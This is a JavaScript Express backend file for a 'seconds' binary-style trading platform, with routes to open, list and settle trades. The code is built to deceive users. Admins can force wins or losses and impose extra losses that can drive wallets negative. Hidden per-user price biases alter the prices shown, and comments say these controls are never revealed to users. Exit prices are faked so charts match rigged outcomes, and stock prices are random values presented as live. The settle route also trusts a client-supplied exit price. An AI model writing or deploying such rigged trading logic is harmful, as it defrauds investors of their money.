/**
 * =============================================================================
 *  NEXUS BACKEND — routes/secondsTrade.js
 * =============================================================================
 *  Fixed-time trading:
 *    POST   /open
 *    GET    /active
 *    GET    /history
 *    POST   /settle/:id
 *    GET    /markets          — reference live prices (proxy + bias)
 * =============================================================================
 */

import { Router } from "express";
import { body, param, validationResult } from "express-validator";
import mongoose from "mongoose";

import User from "../models/User.js";
import SecondsTrade from "../models/SecondsTrade.js";
import Transaction from "../models/Transaction.js";
import { requireAuth } from "../middleware/auth.js";

const router = Router();

const DEFAULT_PAYOUT = 85;
const MIN_DURATION = 10;
const MAX_DURATION = 3600;

const CRYPTO_ASSETS = ["BTC", "ETH", "SOL", "BNB", "XRP"];
const STOCK_ASSETS = ["AAPL", "TSLA", "AMZN", "NVDA", "GOOGL"];

/** Fallback reference prices when external feed is unavailable */
const FALLBACK_PRICES = {
  BTC: 68000,
  ETH: 3500,
  SOL: 145,
  BNB: 580,
  XRP: 0.62,
  AAPL: 210,
  TSLA: 250,
  AMZN: 190,
  NVDA: 120,
  GOOGL: 175,
};

const asyncHandler = (fn) => (req, res, next) =>
  Promise.resolve(fn(req, res, next)).catch(next);

const sendValidationError = (res, errors) =>
  res.status(422).json({
    success: false,
    error: "ValidationError",
    message: "One or more fields are invalid.",
    details: errors.array().map((e) => ({
      field: e.path || e.param,
      message: e.msg,
    })),
  });

const requireDatabase = (_req, res, next) => {
  if (mongoose.connection.readyState !== 1) {
    return res.status(503).json({
      success: false,
      error: "ServiceUnavailable",
      message: "Database is offline. Trading is temporarily disabled.",
    });
  }
  return next();
};

const walletToObject = (wallet) => {
  if (!wallet) return {};
  if (wallet instanceof Map) return Object.fromEntries(wallet);
  return { ...wallet };
};

/** Public user-facing trade payload — never leak admin control fields */
const serializeTrade = (t, { forAdmin = false } = {}) => {
  const doc = typeof t.toObject === "function" ? t.toObject() : { ...t };
  const now = Date.now();
  const expiresAt = new Date(doc.expiresAt).getTime();
  const remainingSec = Math.max(0, Math.ceil((expiresAt - now) / 1000));

  const base = {
    _id: doc._id,
    asset: doc.asset,
    assetType: doc.assetType,
    direction: doc.direction,
    stake: doc.stake,
    durationSec: doc.durationSec,
    entryPrice: doc.entryPrice,
    exitPrice: doc.exitPrice,
    status: doc.status,
    payout: doc.payout,
    openedAt: doc.openedAt,
    expiresAt: doc.expiresAt,
    settledAt: doc.settledAt,
    createdAt: doc.createdAt,
    updatedAt: doc.updatedAt,
    remainingSec,
    isExpired: remainingSec <= 0 && doc.status === "open",
  };

  // Settled wins may show natural profit % only for market wins (never admin %)
  if (
    doc.status === "won" &&
    doc.payoutPercent != null &&
    doc.settleReason !== "admin_force"
  ) {
    base.payoutPercent = doc.payoutPercent;
  }
  // Settled losses: show loss amount only (stake / extra), never admin tags
  if (doc.status === "lost") {
    base.lossAmount = Number(doc.lossAmount || doc.stake || 0);
  }

  if (forAdmin) {
    return {
      ...base,
      user: doc.user,
      forcedOutcome: doc.forcedOutcome,
      forcedAmount: doc.forcedAmount,
      priceBiasPercent: doc.priceBiasPercent,
      payoutPercent: doc.payoutPercent,
      settleReason: doc.settleReason,
      lossAmount: doc.lossAmount,
    };
  }

  return base;
};

async function fetchLivePrice(asset) {
  const sym = String(asset).toUpperCase();
  if (CRYPTO_ASSETS.includes(sym)) {
    try {
      const pair = `${sym}USDT`;
      const ctrl = AbortSignal.timeout(4000);
      const res = await fetch(
        `https://api.binance.com/api/v3/ticker/price?symbol=${pair}`,
        { signal: ctrl }
      );
      if (res.ok) {
        const data = await res.json();
        const price = Number(data.price);
        if (Number.isFinite(price) && price > 0) return price;
      }
    } catch {
      /* fall through */
    }
  }
  // Stocks / fallback — mild random walk around seed
  const base = FALLBACK_PRICES[sym] || 100;
  const jitter = 1 + (Math.random() - 0.5) * 0.004;
  return Number((base * jitter).toFixed(sym === "XRP" ? 4 : 2));
}

function applyBias(price, biasPercent) {
  const b = Number(biasPercent) || 0;
  return price * (1 + b / 100);
}

/**
 * Resolve win/loss for an open trade and credit wallet if won.
 * Atomic claim prevents double-settle (balance jumping).
 *
 * Force WIN + Manual Balance Add X:
 *   wallet += stake + |X|   (example: stake 298 + add 25 → +323)
 * Force LOSS + Manual Balance Add X:
 *   wallet -= |X|           (may go negative / red)
 */
export async function settleTrade(tradeId, { exitPriceHint } = {}) {
  // Claim the open trade so concurrent settlers cannot double-credit
  const trade = await SecondsTrade.findOneAndUpdate(
    { _id: tradeId, status: "open" },
    { $set: { status: "settling" } },
    { new: true }
  );
  if (!trade) {
    return SecondsTrade.findById(tradeId);
  }

  const user = await User.findById(trade.user);
  if (!user) {
    trade.status = "open";
    await trade.save();
    return trade;
  }

  let exitPrice =
    exitPriceHint != null
      ? Number(exitPriceHint)
      : await fetchLivePrice(trade.asset);
  exitPrice = applyBias(exitPrice, trade.priceBiasPercent);

  // Outcome priority: per-trade forced → user sticky control → market
  let outcome = null;
  let reason = "market";

  if (trade.forcedOutcome === "win" || trade.forcedOutcome === "loss") {
    outcome = trade.forcedOutcome;
    reason = "admin_force";
  } else if (user.tradeControlState === "force_win") {
    outcome = "win";
    reason = "user_force_win";
  } else if (user.tradeControlState === "force_loss") {
    outcome = "loss";
    reason = "user_force_loss";
  } else {
    const rose = exitPrice >= trade.entryPrice;
    const won =
      (trade.direction === "long" && rose) ||
      (trade.direction === "short" && !rose);
    outcome = won ? "win" : "loss";
    reason = "market";
  }

  // Force display exit for win/loss graph consistency
  if (outcome === "win") {
    if (trade.direction === "long") {
      exitPrice = Math.max(exitPrice, trade.entryPrice * 1.004);
    } else {
      exitPrice = Math.min(exitPrice, trade.entryPrice * 0.996);
    }
  } else {
    if (trade.direction === "long") {
      exitPrice = Math.min(exitPrice, trade.entryPrice * 0.996);
    } else {
      exitPrice = Math.max(exitPrice, trade.entryPrice * 1.004);
    }
  }

  let payout = 0;
  // Re-read wallet at credit time (fresh) — avoids stale concurrent reads
  const fresh = await User.findById(user._id);
  const usdt = fresh.wallet.get("USDT") || 0;

  if (outcome === "win") {
    let profit = 0;
    if (
      reason === "admin_force" &&
      trade.forcedAmount != null &&
      Number.isFinite(Number(trade.forcedAmount))
    ) {
      // Exact Manual Balance Add — NEVER percentage
      profit = Math.abs(Number(trade.forcedAmount));
      trade.payoutPercent = undefined;
      trade.set("payoutPercent", undefined);
    } else {
      let pct = DEFAULT_PAYOUT;
      if (reason === "user_force_win") {
        const fromUser = Number(fresh.tradeControlPercentage);
        if (Number.isFinite(fromUser) && fromUser > 0) pct = fromUser;
      } else {
        const fromTrade = Number(trade.payoutPercent);
        if (Number.isFinite(fromTrade) && fromTrade > 0) pct = fromTrade;
      }
      profit = trade.stake * (pct / 100);
      trade.payoutPercent = pct;
    }
    // Final credit = stake returned + manual profit (e.g. 298 + 25 = 323)
    payout = Number(trade.stake) + profit;
    fresh.wallet.set("USDT", usdt + payout);
    fresh.markModified("wallet");
    await fresh.save();
    await Transaction.create({
      user: fresh._id,
      kind: "trade",
      side: trade.direction === "long" ? "buy" : "sell",
      symbol: trade.asset,
      amount: trade.stake,
      usdValue: payout,
      status: "completed",
      reviewerNote: `Seconds WIN · stake $${Number(trade.stake).toFixed(
        2
      )} + add $${profit.toFixed(2)} = $${payout.toFixed(2)} · ${reason}`,
    });
  } else {
    let extraLoss = 0;
    if (
      reason === "admin_force" &&
      trade.forcedAmount != null &&
      Number.isFinite(Number(trade.forcedAmount))
    ) {
      extraLoss = Math.abs(Number(trade.forcedAmount));
      fresh.wallet.set("USDT", usdt - extraLoss);
      fresh.markModified("wallet");
      await fresh.save();
      trade.payoutPercent = undefined;
      trade.set("payoutPercent", undefined);
    } else if (reason === "user_force_loss") {
      const fromUser = Number(fresh.tradeControlPercentage);
      if (Number.isFinite(fromUser) && fromUser > 0) {
        extraLoss = trade.stake * (fromUser / 100);
        fresh.wallet.set("USDT", usdt - extraLoss);
        fresh.markModified("wallet");
        await fresh.save();
      }
    }
    trade.lossAmount = Number(trade.stake) + extraLoss;
    payout = 0;
    await Transaction.create({
      user: fresh._id,
      kind: "trade",
      side: trade.direction === "long" ? "buy" : "sell",
      symbol: trade.asset,
      amount: trade.stake,
      usdValue: 0,
      status: "completed",
      reviewerNote: `Seconds LOSS · stake −$${Number(trade.stake).toFixed(
        2
      )}${extraLoss ? ` + add −$${extraLoss.toFixed(2)}` : ""} · ${reason}`,
    });
  }

  trade.status = outcome === "win" ? "won" : "lost";
  trade.exitPrice = exitPrice;
  trade.payout = payout;
  trade.settledAt = new Date();
  trade.settleReason = reason;
  await trade.save();

  return trade;
}

/** Background settler — call from server bootstrap */
export async function settleExpiredTrades() {
  if (mongoose.connection.readyState !== 1) return 0;
  // Unstick crashed mid-settle claims
  await SecondsTrade.updateMany(
    {
      status: "settling",
      updatedAt: { $lte: new Date(Date.now() - 15000) },
    },
    { $set: { status: "open" } }
  );
  const now = new Date();
  const expired = await SecondsTrade.find({
    status: "open",
    expiresAt: { $lte: now },
  }).limit(50);
  for (const t of expired) {
    try {
      await settleTrade(t._id);
    } catch (err) {
      console.error("[seconds-trade] settle failed", t._id, err?.message);
    }
  }
  return expired.length;
}

// ---------------------------------------------------------------------------
// GET /markets
// ---------------------------------------------------------------------------
router.get(
  "/markets",
  requireAuth,
  asyncHandler(async (req, res) => {
    const user = await User.findById(req.auth.sub).select("chartBias");
    const biasMap = walletToObject(user?.chartBias);

    const assets = [
      ...CRYPTO_ASSETS.map((a) => ({ asset: a, assetType: "crypto" })),
      ...STOCK_ASSETS.map((a) => ({ asset: a, assetType: "stock" })),
    ];

    const prices = await Promise.all(
      assets.map(async ({ asset, assetType }) => {
        const raw = await fetchLivePrice(asset);
        const bias = Number(biasMap[asset] || 0);
        const display = applyBias(raw, bias);
        return {
          asset,
          assetType,
          price: display,
          rawPrice: raw,
          biasPercent: bias,
        };
      })
    );

    // Open trades biases for this user (overlay on matching assets)
    const open = await SecondsTrade.find({
      user: req.auth.sub,
      status: "open",
    }).select("asset priceBiasPercent");

    const tradeBias = {};
    for (const t of open) {
      tradeBias[t.asset] =
        (tradeBias[t.asset] || 0) + Number(t.priceBiasPercent || 0);
    }

    const merged = prices.map((p) => {
      const extra = tradeBias[p.asset] || 0;
      if (!extra) {
        // Never expose biasPercent to the user client
        return {
          asset: p.asset,
          assetType: p.assetType,
          price: p.price,
        };
      }
      const totalBias = p.biasPercent + extra;
      return {
        asset: p.asset,
        assetType: p.assetType,
        price: applyBias(p.rawPrice, totalBias),
      };
    });

    res.json({ success: true, markets: merged, serverTime: new Date().toISOString() });
  })
);

// ---------------------------------------------------------------------------
// POST /open
// ---------------------------------------------------------------------------
router.post(
  "/open",
  requireAuth,
  requireDatabase,
  [
    body("asset").isString().trim().isLength({ min: 2, max: 12 }),
    body("direction").isIn(["long", "short"]),
    body("stake").isFloat({ gt: 0 }),
    body("durationSec").isInt({ min: MIN_DURATION, max: MAX_DURATION }),
    body("entryPrice").optional().isFloat({ gt: 0 }),
  ],
  asyncHandler(async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return sendValidationError(res, errors);

    const asset = String(req.body.asset).toUpperCase();
    const direction = req.body.direction;
    const stake = Number(req.body.stake);
    const durationSec = Number(req.body.durationSec);
    const assetType = STOCK_ASSETS.includes(asset)
      ? "stock"
      : CRYPTO_ASSETS.includes(asset)
        ? "crypto"
        : null;

    if (!assetType) {
      return res.status(400).json({
        success: false,
        error: "BadRequestError",
        message: `Unsupported asset. Allowed: ${[...CRYPTO_ASSETS, ...STOCK_ASSETS].join(", ")}`,
      });
    }

    const user = await User.findById(req.auth.sub);
    if (!user) {
      return res.status(404).json({
        success: false,
        error: "NotFoundError",
        message: "User not found.",
      });
    }
    if (user.banned) {
      return res.status(403).json({
        success: false,
        error: "ForbiddenError",
        message: "Account is suspended.",
      });
    }

    const usdt = user.wallet.get("USDT") || 0;
    if (usdt < stake) {
      return res.status(400).json({
        success: false,
        error: "InsufficientFunds",
        message: `Need ${stake} USDT — wallet has ${usdt.toFixed(2)}.`,
      });
    }

    let entryPrice = Number(req.body.entryPrice);
    if (!Number.isFinite(entryPrice) || entryPrice <= 0) {
      entryPrice = await fetchLivePrice(asset);
    }
    const chartBias = Number(user.chartBias?.get?.(asset) || user.chartBias?.[asset] || 0);
    entryPrice = applyBias(entryPrice, chartBias);

    user.wallet.set("USDT", usdt - stake);
    user.markModified("wallet");
    await user.save();

    const openedAt = new Date();
    const expiresAt = new Date(openedAt.getTime() + durationSec * 1000);

    const trade = await SecondsTrade.create({
      user: user._id,
      asset,
      assetType,
      direction,
      stake,
      durationSec,
      entryPrice,
      payoutPercent: DEFAULT_PAYOUT,
      openedAt,
      expiresAt,
      status: "open",
    });

    await Transaction.create({
      user: user._id,
      kind: "trade",
      side: direction === "long" ? "buy" : "sell",
      symbol: asset,
      amount: stake,
      usdValue: stake,
      status: "completed",
      reviewerNote: `Seconds trade OPEN ${direction.toUpperCase()} ${durationSec}s`,
    });

    res.status(201).json({
      success: true,
      trade: serializeTrade(trade),
      user: {
        id: user._id,
        wallet: walletToObject(user.wallet),
      },
    });
  })
);

// ---------------------------------------------------------------------------
// GET /active
// ---------------------------------------------------------------------------
router.get(
  "/active",
  requireAuth,
  requireDatabase,
  asyncHandler(async (req, res) => {
    // Opportunistic settle
    const due = await SecondsTrade.find({
      user: req.auth.sub,
      status: "open",
      expiresAt: { $lte: new Date() },
    }).limit(20);
    for (const t of due) {
      await settleTrade(t._id);
    }

    const trades = await SecondsTrade.find({
      user: req.auth.sub,
      status: "open",
    }).sort({ openedAt: -1 });

    res.json({
      success: true,
      trades: trades.map(serializeTrade),
      serverTime: new Date().toISOString(),
    });
  })
);

// ---------------------------------------------------------------------------
// GET /history
// ---------------------------------------------------------------------------
router.get(
  "/history",
  requireAuth,
  requireDatabase,
  asyncHandler(async (req, res) => {
    const trades = await SecondsTrade.find({
      user: req.auth.sub,
      status: { $in: ["won", "lost", "cancelled"] },
    })
      .sort({ settledAt: -1, createdAt: -1 })
      .limit(200);

    const serialized = trades.map(serializeTrade);

    // Daily P/L rollup (UTC date key)
    const byDay = {};
    for (const t of serialized) {
      const when = t.settledAt || t.createdAt;
      const day = new Date(when).toISOString().slice(0, 10);
      if (!byDay[day]) {
        byDay[day] = {
          date: day,
          wins: 0,
          losses: 0,
          profit: 0,
          lossAmount: 0,
          net: 0,
        };
      }
      const row = byDay[day];
      if (t.status === "won") {
        const profit = Math.max(0, Number(t.payout || 0) - Number(t.stake || 0));
        row.wins += 1;
        row.profit += profit;
        row.net += profit;
      } else if (t.status === "lost") {
        row.losses += 1;
        row.lossAmount += Number(t.stake || 0);
        row.net -= Number(t.stake || 0);
      }
    }
    const daily = Object.values(byDay).sort((a, b) =>
      a.date < b.date ? 1 : -1
    );

    res.json({
      success: true,
      trades: serialized,
      daily,
      totals: {
        wins: serialized.filter((t) => t.status === "won").length,
        losses: serialized.filter((t) => t.status === "lost").length,
        net: daily.reduce((s, d) => s + d.net, 0),
      },
    });
  })
);

// ---------------------------------------------------------------------------
// POST /settle/:id
// ---------------------------------------------------------------------------
router.post(
  "/settle/:id",
  requireAuth,
  requireDatabase,
  [param("id").isMongoId()],
  asyncHandler(async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return sendValidationError(res, errors);

    const trade = await SecondsTrade.findById(req.params.id);
    if (!trade || String(trade.user) !== String(req.auth.sub)) {
      return res.status(404).json({
        success: false,
        error: "NotFoundError",
        message: "Trade not found.",
      });
    }

    if (trade.status !== "open" && trade.status !== "settling") {
      const userDone = await User.findById(req.auth.sub);
      return res.json({
        success: true,
        trade: serializeTrade(trade),
        user: userDone
          ? { id: userDone._id, wallet: walletToObject(userDone.wallet) }
          : null,
      });
    }

    // Allow settle only at/after expiry (2s grace for clock skew)
    if (
      trade.status === "open" &&
      Date.now() + 2000 < new Date(trade.expiresAt).getTime()
    ) {
      return res.status(400).json({
        success: false,
        error: "TooEarly",
        message: "Trade has not expired yet.",
        trade: serializeTrade(trade),
      });
    }

    const settled = await settleTrade(trade._id, {
      exitPriceHint: req.body?.exitPrice,
    });
    const user = await User.findById(req.auth.sub);

    res.json({
      success: true,
      trade: serializeTrade(settled),
      user: user
        ? { id: user._id, wallet: walletToObject(user.wallet) }
        : null,
    });
  })
);

export default router;
export { CRYPTO_ASSETS, STOCK_ASSETS, FALLBACK_PRICES, fetchLivePrice };
